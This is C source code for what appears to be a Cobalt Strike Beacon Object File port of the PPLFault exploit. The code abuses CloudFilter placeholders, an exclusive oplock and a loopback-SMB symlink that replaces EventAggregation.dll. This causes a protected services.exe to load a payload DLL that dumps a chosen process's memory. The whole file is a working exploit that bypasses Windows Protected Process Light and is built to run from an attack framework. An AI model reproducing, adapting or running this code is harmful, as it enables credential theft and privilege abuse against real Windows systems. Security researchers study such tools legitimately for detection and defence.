// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#include <phnt_windows.h>
#include <phnt.h>
#include <cfapi.h>
#include <pathcch.h>
#include <Shlwapi.h>
#include <stdint.h>

#include "bofdefs.h"
#include "beacon.h"
#include "MemoryCommand.h"
#include "Payload.h"
#include "DumpShellcode.h"
#include "fnptr.h"

CF_CONNECTION_KEY gConnectionKey = { 0, };
WIN32_FILE_ATTRIBUTE_DATA gBenignFileAttributes = { 0, };
HANDLE hBenignFile = NULL;
HANDLE hPayloadFile = NULL;
HANDLE hCurrentFile = NULL;

const wchar_t* gpOplockFile = L"C:\\Windows\\System32\\devobj.dll";

typedef struct oplock {
    HANDLE hFile;
    HANDLE hEvent;
}oplock;

#define HIJACK_DLL_PATH L"C:\\Windows\\System32\\EventAggregation.dll"
#define HIJACK_DLL_PATH_BACKUP L"C:\\Windows\\System32\\EventAggregation.dll.bak"
#define PLACEHOLDER_DLL_DIR L"C:\\PPLFaultTemp\\"
#define PLACEHOLDER_DLL_BASENAME L"EventAggregationPH.dll"
#define PLACEHOLDER_DLL_PATH PLACEHOLDER_DLL_DIR  PLACEHOLDER_DLL_BASENAME
#define PLACEHOLDER_DLL_PATH_SMB L"\\\\127.0.0.1\\C$\\PPLFaultTemp\\" PLACEHOLDER_DLL_BASENAME
#define PAYLOAD_DLL_PATH L"C:\\PPLFaultTemp\\PPLFaultPayload.dll"



// Acquires a level 1 (aka exclusive) oplock to gpOplockFile and stores the resulting file handle in hOplockFile
//returns resources that should be closed, cleaned
BOOL AcquireOplock(HANDLE *hFile, HANDLE *hEvent)
{

    OVERLAPPED ovl = { 0 };

    *hFile = KERNEL32$CreateFileW(
        gpOplockFile, FILE_READ_ATTRIBUTES, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
    if (INVALID_HANDLE_VALUE == *hFile)
    {
        BeaconPrintf(CALLBACK_ERROR, "CreateFile for oplock failed with GLE %u", KERNEL32$GetLastError());
        return FALSE;
    }

    ovl.hEvent = KERNEL32$CreateEventW(NULL, TRUE, FALSE, NULL);
    if (KERNEL32$DeviceIoControl(*hFile, FSCTL_REQUEST_OPLOCK_LEVEL_1, NULL, 0, NULL, 0, NULL, &ovl))
    {
        BeaconPrintf(CALLBACK_ERROR, "DeviceIoControl for oplock succeeded when it should not have");
        KERNEL32$CloseHandle(*hFile);
        KERNEL32$CloseHandle(ovl.hEvent);
        return FALSE;
    }

    if (ERROR_IO_PENDING != KERNEL32$GetLastError())
    {
        BeaconPrintf(CALLBACK_ERROR,"DeviceIoControl for oplock failed with unexpected GLE %u", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(*hFile);
        KERNEL32$CloseHandle(ovl.hEvent);
        return FALSE;
    }

    internal_printf( "Acquired exclusive oplock to file: %ws\n", gpOplockFile);
    
    *hEvent = ovl.hEvent;

    return TRUE;
}

void ReleaseOplock(oplock* op)
{
    if (op->hFile && op->hFile != INVALID_HANDLE_VALUE)
    {
        KERNEL32$CloseHandle(op->hFile);
        op->hFile = NULL;
    }
    if (op->hEvent && op->hEvent != INVALID_HANDLE_VALUE)
    {
        KERNEL32$CloseHandle(op->hEvent);
        op->hEvent = NULL;
    }
}


// This is our CloudFilter rehydration callback
VOID CALLBACK FetchDataCallback (
    CONST CF_CALLBACK_INFO* CallbackInfo,
    CONST CF_CALLBACK_PARAMETERS* CallbackParameters
    )
{
    void* buf;
    DWORD bytesRead = 0;
    NTSTATUS ntStatus = 0;
    HRESULT hRet = S_OK;
    fpTryAcquireSRWLockExclusive _TryAcquireSRWLockExclusive = (fpTryAcquireSRWLockExclusive ) GetProcAddress(hkernel32, "TryAcquireSRWLockExclusive");
    fpReleaseSRWLockExclusive _ReleaseSRWLockExclusive = (fpReleaseSRWLockExclusive ) GetProcAddress(hkernel32, "ReleaseSRWLockExclusive");
    fpSetFilePointerEx _SetFilePointerEx = (fpSetFilePointerEx ) GetProcAddress(hkernel32, "SetFilePointerEx");
    fpCfExecute _CfExecute = (fpCfExecute ) GetProcAddress(hcldapi, "CfExecute");
    static SRWLOCK sFetchDataCallback = SRWLOCK_INIT;

    internal_printf( "FetchDataCallback called.\n");

    // Use an SRWLock to synchronize this function
    _TryAcquireSRWLockExclusive(&sFetchDataCallback);

    // Read the current file's contents at requested offset into a local buffer
    // This could be either the benign file, or the payload file
    buf = intAlloc(CallbackParameters->FetchData.RequiredLength.QuadPart);
  /*  buf.resize(CallbackParameters->FetchData.RequiredLength.QuadPart);*/
    if (!_SetFilePointerEx(hCurrentFile, CallbackParameters->FetchData.RequiredFileOffset, NULL, FILE_BEGIN))
    {
        ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
        BeaconPrintf(CALLBACK_ERROR, "SetFilePointerEx failed with GLE %u", KERNEL32$GetLastError());
    }
    if (!KERNEL32$ReadFile(hCurrentFile, buf, (DWORD)CallbackParameters->FetchData.RequiredLength.QuadPart, &bytesRead, NULL))
    {
        ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
        BeaconPrintf(CALLBACK_ERROR, "ReadFile failed with GLE %u", KERNEL32$GetLastError());
    }

    CF_OPERATION_INFO opInfo = { 0, };
    CF_OPERATION_PARAMETERS opParams = { 0, };

    opInfo.StructSize = sizeof(opInfo);
    opInfo.Type = CF_OPERATION_TYPE_TRANSFER_DATA;
    opInfo.ConnectionKey = CallbackInfo->ConnectionKey;
    opInfo.TransferKey = CallbackInfo->TransferKey;
    
    opParams.ParamSize = sizeof(opParams);
    opParams.TransferData.CompletionStatus = ntStatus;
    opParams.TransferData.Buffer = buf;
    opParams.TransferData.Offset = CallbackParameters->FetchData.RequiredFileOffset;
    opParams.TransferData.Length.QuadPart = bytesRead;
    
    internal_printf( "Hydrating %llu bytes at offset %llu\n", 
        opParams.TransferData.Length.QuadPart,
        opParams.TransferData.Offset.QuadPart);

    hRet = _CfExecute(&opInfo, &opParams);
    if (!SUCCEEDED(hRet))
    {
        BeaconPrintf(CALLBACK_ERROR, "CfExecute failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
    }

    // Once the benign file has been fully read once, switch over to the payload
    if ((hCurrentFile == hBenignFile) &&
        ((CallbackParameters->FetchData.RequiredFileOffset.QuadPart + CallbackParameters->FetchData.RequiredLength.QuadPart) >=
            gBenignFileAttributes.nFileSizeLow))

    {
        internal_printf( "Switching to payload\n");
        hCurrentFile = hPayloadFile;

        internal_printf( "Emptying system working set\n");
        EmptySystemWorkingSet();

        internal_printf( "Give the memory manager a moment to think\n");
        KERNEL32$Sleep(100);

        MSVCRT$memset(buf, 0, CallbackParameters->FetchData.RequiredLength.QuadPart);
        intFree(buf);
        buf = intAlloc(gBenignFileAttributes.nFileSizeLow);
        LARGE_INTEGER offset = { 0,0 };
        if (!_SetFilePointerEx(hCurrentFile, offset, NULL, FILE_BEGIN))
        {
            ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
            BeaconPrintf(CALLBACK_ERROR, "SetFilePointerEx failed with GLE %u", KERNEL32$GetLastError());
        }

        if (!KERNEL32$ReadFile(hCurrentFile, buf, gBenignFileAttributes.nFileSizeLow, &bytesRead, NULL))
        {
            ntStatus = NTSTATUS_FROM_WIN32(KERNEL32$GetLastError());
            BeaconPrintf(CALLBACK_ERROR, "ReadFile failed with GLE %u", KERNEL32$GetLastError());
        }

        opParams.TransferData.Buffer = buf;
        opParams.TransferData.Offset.QuadPart = 0;
        opParams.TransferData.Length.QuadPart = bytesRead;

        internal_printf( "Hydrating %llu PAYLOAD bytes at offset %llu\n",
            opParams.TransferData.Length.QuadPart,
            opParams.TransferData.Offset.QuadPart);

        hRet = _CfExecute(&opInfo, &opParams);
        if (!SUCCEEDED(hRet))
        {
            BeaconPrintf(CALLBACK_ERROR, "CfExecute failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
        }

        // With the payload staged, release the oplock to allow the victim to execute
        ReleaseOplock(CallbackInfo->CallbackContext);
    }
    intFree(buf);
    _ReleaseSRWLockExclusive(&sFetchDataCallback);
}

// Uses SeRestorePrivilege to move the given file
BOOL MoveFileWithPrivilege(const wchar_t * src, wchar_t * dest)
{
    BOOL bResult = FALSE;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BOOLEAN ignored = 0;
    NTSTATUS ntStatus = 0;
    PFILE_RENAME_INFO pRenameInfo = NULL;
    void* buf = NULL;
    wchar_t ntDest[MAX_PATH] = L"\\??\\";
    GetFNPtr(hntdll, "RtlAdjustPrivilege", _RtlAdjustPrivilege, fpRtlAdjustPrivilege);
    GetFNPtr(hkernel32, "SetFileInformationByHandle", _SetFileInformationByHandle, fpSetFileInformationByHandle);
    MSVCRT$wcscat(ntDest, dest);

    ntStatus = _RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE, TRUE, FALSE, &ignored);
    if (0 != ntStatus)
    {
        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_BACKUP_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
        goto Cleanup;
    }

    ntStatus = _RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE, TRUE, FALSE, &ignored);
    if (0 != ntStatus)
    {
        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: RtlAdjustPrivilege(SE_RESTORE_PRIVILEGE) failed with NTSTATUS 0x%08x", ntStatus);
        goto Cleanup;
    }

    hFile = KERNEL32$CreateFileW(
        src, 
        SYNCHRONIZE | DELETE, 
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, 
        NULL, 
        OPEN_EXISTING, 
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, 
        NULL);
    if (INVALID_HANDLE_VALUE == hFile)
    {
        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: CreateFile failed with GLE %u", KERNEL32$GetLastError());
        goto Cleanup;
    }
    buf = intAlloc(sizeof(FILE_RENAME_INFO) + (MSVCRT$wcslen(ntDest) * sizeof(wchar_t)) + 2);
    pRenameInfo = (PFILE_RENAME_INFO)buf;
    pRenameInfo->FileNameLength = (DWORD)(MSVCRT$wcslen(ntDest) * sizeof(wchar_t));
    MSVCRT$memcpy(pRenameInfo->FileName, ntDest, pRenameInfo->FileNameLength);

    if (!_SetFileInformationByHandle(hFile, FileRenameInfo, pRenameInfo, (DWORD)pRenameInfo->FileNameLength))
    {
        BeaconPrintf(CALLBACK_ERROR, "MoveFileWithPrivilege: SetFileInformationByHandle failed with GLE %u", KERNEL32$GetLastError());
        goto Cleanup;
    }

    bResult = TRUE;

Cleanup:
    if (INVALID_HANDLE_VALUE != hFile)
    {
        KERNEL32$CloseHandle(hFile);
    }
    if (buf)
    {
        intFree(buf);
    }

    return bResult;
}

//checked
BOOL FileExists(const wchar_t* path)
{
    return (INVALID_FILE_ATTRIBUTES != KERNEL32$GetFileAttributesW(path));
}

// Replace HIJACK_DLL_PATH symlink to PLACEHOLDER_DLL_PATH_SMB
BOOL InstallSymlink()
{
    GetFNPtr(hkernel32, "CreateSymbolicLinkW", _CreateSymbolicLinkW, fpCreateSymbolicLinkW);
    // Make sure PLACEHOLDER exists
    if (!FileExists(PLACEHOLDER_DLL_PATH))
    {
        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: Placeholder does not exist.  Refusing to install symlink.  GLE: %u", KERNEL32$GetLastError());
        return FALSE;
    }
    
    // Move HIJACK => BACKUP
    if (!MoveFileWithPrivilege(HIJACK_DLL_PATH, HIJACK_DLL_PATH_BACKUP))
    {
        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: MoveFileExW failed with GLE: %u", KERNEL32$GetLastError());
        return FALSE;
    }
    
    // Symlink HIJACK => PLACEHOLDER over SMB
    if (!_CreateSymbolicLinkW(HIJACK_DLL_PATH, PLACEHOLDER_DLL_PATH_SMB, 0))
    {
        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: CreateSymbolicLinkW failed with GLE: %u", KERNEL32$GetLastError());
        return FALSE;
    }

    return TRUE;
}

// Reverts the changes done by InstallSymlink()
BOOL CleanupSymlink()
{
    // Delete PLACEHOLDER
    (void)KERNEL32$DeleteFileW(PLACEHOLDER_DLL_PATH);

    // Make sure BACKUP exists before attempting to restore
    if (!FileExists(HIJACK_DLL_PATH_BACKUP))
    {
        internal_printf( "No cleanup necessary.  Backup does not exist.\n");
        return FALSE;
    }

    // Delete symlink
    (void)KERNEL32$DeleteFileW(HIJACK_DLL_PATH);

    // Restore BACKUP => HIJACK
    if (!MoveFileWithPrivilege(HIJACK_DLL_PATH_BACKUP, HIJACK_DLL_PATH))
    {
        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink: MoveFileExW failed with GLE: %u", KERNEL32$GetLastError());
        return FALSE;
    }
    
    return TRUE;
}

// Launches services.exe as WinTcb-Light and waits up to 60s for it
BOOL SpawnPPL()
{
    wchar_t childPath[] = L"C:\\Windows\\System32\\services.exe";
    STARTUPINFOW si = { 0, };
    PROCESS_INFORMATION pi = { 0, };
    DWORD dwResult = 0;

    si.cb = sizeof(si);

    if (!KERNEL32$CreateProcessW(childPath, NULL, NULL, NULL, FALSE, CREATE_PROTECTED_PROCESS, NULL, NULL, &si, &pi))
    {
        BeaconPrintf(CALLBACK_ERROR, "SpawnPPL: CreateProcessW failed with GLE: %u", KERNEL32$GetLastError());
        return FALSE;
    }

    internal_printf( "SpawnPPL: Waiting for child process to finish.\n");
    
    dwResult = KERNEL32$WaitForSingleObject(pi.hProcess, 60 * 1000);
    if (WAIT_OBJECT_0 != dwResult)
    {
        BeaconPrintf(CALLBACK_ERROR, "SpawnPPL: WaitForSingleObject returned %u.  Expected WAIT_OBJECT_0.  GLE: %u", dwResult, KERNEL32$GetLastError());
    }

    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    return FALSE;
}

// Is this a valid PID?
BOOL IsValidPID(DWORD dwProcessId)
{
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
    if (NULL == hProcess)
    {
        return FALSE;
    }
    KERNEL32$CloseHandle(hProcess);
    return TRUE;
}

int progentry(DWORD dwTargetProcessId, wchar_t * outputPath, uint8_t* shellcode, DWORD shellcodelen)
{
    GetFNPtr(hkernel32, "GetTickCount64", _GetTickCount64, fpGetTickCount64);
    int result = 1;
    DWORD bytesWritten = 0;
    DWORD ignored = 0;
    HRESULT hRet = S_OK;
    CF_CONNECTION_KEY key = { 0 };
    ULONGLONG startTime = _GetTickCount64();
    ULONGLONG endTime = 0;
    wchar_t * dumpPath;
    char* payloadBuf;
    BOOL registered = FALSE;
    BOOL linked = FALSE;
    BOOL connected = FALSE;
    oplock* op = intAlloc(sizeof(oplock));
    GetFNPtr(hkernel32, "CreateDirectoryW", _CreateDirectoryW, fpCreateDirectoryW);
    GetFNPtr(hcldapi, "CfConnectSyncRoot", _CfConnectSyncRoot, fpCfConnectSyncRoot);
    GetFNPtr(hcldapi, "CfUnregisterSyncRoot", _CfUnregisterSyncRoot, fpCfUnregisterSyncRoot);
    GetFNPtr(hcldapi, "CfRegisterSyncRoot", _CfRegisterSyncRoot, fpCfRegisterSyncRoot);
    GetFNPtr(hkernel32, "WriteFile", _WriteFile, fpWriteFile);
    GetFNPtr(hcldapi, "CfDisconnectSyncRoot", _CfDisconnectSyncRoot, fpCfDisconnectSyncRoot);
    // Handle verbose logging

    // Extract args
    dumpPath = outputPath;
    if (!IsValidPID(dwTargetProcessId))
    {
        BeaconPrintf(CALLBACK_ERROR, "This doesn't appear to be a valid PID: %u", dwTargetProcessId);
        return 1;
    }

    // Clean up from any previous failed runs
    (void)CleanupSymlink();
    (void)_CreateDirectoryW(PLACEHOLDER_DLL_DIR, NULL);

    hBenignFile = KERNEL32$CreateFileW(HIJACK_DLL_PATH, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (INVALID_HANDLE_VALUE == hBenignFile)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open file with GLE %u: %ws", KERNEL32$GetLastError(), HIJACK_DLL_PATH);
        return 1;
    }

    hPayloadFile = KERNEL32$CreateFileW(PAYLOAD_DLL_PATH, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
    if (INVALID_HANDLE_VALUE == hPayloadFile)
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open file with GLE %u: %ws", KERNEL32$GetLastError(), PAYLOAD_DLL_PATH);
        goto Cleanup;
    }

    hCurrentFile = hBenignFile;
    DWORD payloadLen = 0;
    // Create the payload using the benign file
    if (!BuildPayload(hBenignFile, &payloadBuf, dwTargetProcessId, dumpPath, &payloadLen, shellcode, shellcodelen))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to build payload");
        goto Cleanup;
    }


    if (!_WriteFile(hPayloadFile, payloadBuf, (DWORD)payloadLen, &bytesWritten, NULL) ||
        (bytesWritten != payloadLen))
    {
        BeaconPrintf(CALLBACK_ERROR, "Failed to write payload file with GLE %u: %ws", KERNEL32$GetLastError(), PAYLOAD_DLL_PATH);
        goto Cleanup;;
    }
    intFree(payloadBuf);
    GUID gid = { 0x119c6523, 0x407b, 0x446b, { 0xb0, 0xe3, 0xe0, 0x30, 0x11, 0x17, 0x8f, 0x50 } };
    // CloudFilter APIs based on https://googleprojectzero.blogspot.com/2021/01/windows-exploitation-tricks-trapping.html
    CF_SYNC_REGISTRATION syncReg = { 0 };
    syncReg.StructSize = sizeof(CF_SYNC_REGISTRATION);
    syncReg.ProviderName = L"CloudTest";
    syncReg.ProviderVersion = L"1.0";
    // {119C6523-407B-446B-B0E3-E03011178F50}
    syncReg.ProviderId = gid;

    CF_SYNC_POLICIES policies = { 0 };
    policies.StructSize = sizeof(CF_SYNC_POLICIES);
    policies.HardLink = CF_HARDLINK_POLICY_ALLOWED;
    policies.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
    policies.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
    policies.InSync = CF_INSYNC_POLICY_NONE;
    policies.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
    policies.Population.Primary = CF_POPULATION_POLICY_PARTIAL;


    hRet = _CfRegisterSyncRoot(PLACEHOLDER_DLL_DIR, &syncReg, &policies, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
    if (!SUCCEEDED(hRet))
    {
        BeaconPrintf(CALLBACK_ERROR, "CfRegisterSyncRoot failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
        goto Cleanup;
    }
    registered = TRUE;
    if (!AcquireOplock(&(op->hFile), &(op->hEvent)))
    {
        goto Cleanup;
    }

    // Connect our callback to the synchronization root
    CF_CALLBACK_REGISTRATION cbReg[2] = {0};
    cbReg[0].Callback = FetchDataCallback;
    cbReg[0].Type = CF_CALLBACK_TYPE_FETCH_DATA;
    cbReg[1].Type = CF_CALLBACK_TYPE_NONE;

    hRet = _CfConnectSyncRoot(PLACEHOLDER_DLL_DIR, cbReg, op, CF_CONNECT_FLAG_NONE, &gConnectionKey);
    if (!SUCCEEDED(hRet))
    {
        BeaconPrintf(CALLBACK_ERROR, "CfConnectSyncRoot failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
        goto Cleanup;
    }
    connected = TRUE;
    GetFNPtr(hkernel32, "GetFileAttributesExW", _GetFileAttributesExW, fpGetFileAttributesExW);
    if (!_GetFileAttributesExW(HIJACK_DLL_PATH, GetFileExInfoStandard, &gBenignFileAttributes))
    {
        BeaconPrintf(CALLBACK_ERROR, "GetFileAttributesExW on benign file failed with GLE %u", hRet, KERNEL32$GetLastError());
        goto Cleanup;
    }

    // Create placeholder
    CF_PLACEHOLDER_CREATE_INFO phInfo = { 0, };
    phInfo.FsMetadata.FileSize.HighPart = gBenignFileAttributes.nFileSizeHigh;
    phInfo.FsMetadata.FileSize.LowPart = gBenignFileAttributes.nFileSizeLow;
    phInfo.FsMetadata.BasicInfo.FileAttributes = gBenignFileAttributes.dwFileAttributes;
    phInfo.FsMetadata.BasicInfo.CreationTime.LowPart = gBenignFileAttributes.ftCreationTime.dwLowDateTime;
    phInfo.FsMetadata.BasicInfo.CreationTime.HighPart = gBenignFileAttributes.ftCreationTime.dwHighDateTime;
    phInfo.RelativeFileName = PLACEHOLDER_DLL_BASENAME;
    phInfo.Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
    phInfo.FileIdentityLength = 0x130;
    phInfo.FileIdentity = intAlloc(phInfo.FileIdentityLength);

    DWORD processed = 0;
    hRet = CLDAPI$CfCreatePlaceholders(PLACEHOLDER_DLL_DIR, &phInfo, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processed);
    if (!SUCCEEDED(hRet) || (1 != processed))
    {
        BeaconPrintf(CALLBACK_ERROR, "CfCreatePlaceholders failed with HR 0x%08x GLE %u", hRet, KERNEL32$GetLastError());
        goto Cleanup;
    }

    // Replace target file with a symlink over loopback SMB to the placeholder file
    if (!InstallSymlink())
    {
        BeaconPrintf(CALLBACK_ERROR, "InstallSymlink failed.  Aborting.");
        goto Cleanup;
    }
    linked = TRUE;

    internal_printf( "Benign: %ws\n", HIJACK_DLL_PATH_BACKUP);
    internal_printf( "Payload: %ws\n", PAYLOAD_DLL_PATH);
    internal_printf( "Placeholder: %ws\n", PLACEHOLDER_DLL_PATH);



    // Remove any old dump files
    if (FileExists(dumpPath))
    {
        if (KERNEL32$DeleteFileW(dumpPath))
        {
            internal_printf( "Removed old dump file: %ws\n", dumpPath);
        }
        else
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to remove old dump file: %ws", dumpPath);
            goto Cleanup;
        }
    }

    internal_printf( "Ready.  Spawning WinTcb.\n");
    if (!SpawnPPL())
    {
        goto Cleanup;
    }

    if (!FileExists(dumpPath))
    {
        BeaconPrintf(CALLBACK_ERROR, "Did not find expected dump file: %ws", dumpPath);
        goto Cleanup;
    }

    // Print final report
    {
        WIN32_FILE_ATTRIBUTE_DATA dumpAttr = { 0, };
        ULARGE_INTEGER uli = { 0, };
        WCHAR bytesPretty[32] = { 0, };

        if (!_GetFileAttributesExW(dumpPath, GetFileExInfoStandard, &dumpAttr))
        {
            BeaconPrintf(CALLBACK_ERROR, "Failed to find dump file attributes with GLE %u", KERNEL32$GetLastError());
            goto Cleanup;
        }

        uli.LowPart = dumpAttr.nFileSizeLow;
        uli.HighPart = dumpAttr.nFileSizeHigh;

        internal_printf( "Dump saved to: %ws\n", dumpPath);

        if (!SHLWAPI$StrFormatByteSizeW(uli.QuadPart, bytesPretty, _countof(bytesPretty)))
        {
            internal_printf( "StrFormatByteSizeW failed with GLE %u\n", KERNEL32$GetLastError());
        }
        else
        {
            internal_printf( "Dump is %ws\n", bytesPretty);
        }

        endTime = _GetTickCount64();
        internal_printf( "Operation took %u ms\n", endTime - startTime);
    }

    result = 0;

Cleanup:
    if(hPayloadFile)
        KERNEL32$CloseHandle(hPayloadFile);
    if (hBenignFile)
        KERNEL32$CloseHandle(hBenignFile);
    ReleaseOplock(op);
    KERNEL32$Sleep(100);
    if (connected)
    {
        _CfDisconnectSyncRoot(gConnectionKey);
    }
    if (registered)
    {
        _CfUnregisterSyncRoot(PLACEHOLDER_DLL_DIR);
    }
    if (linked);
    CleanupSymlink();
    intFree(op);
    
    return result;
}


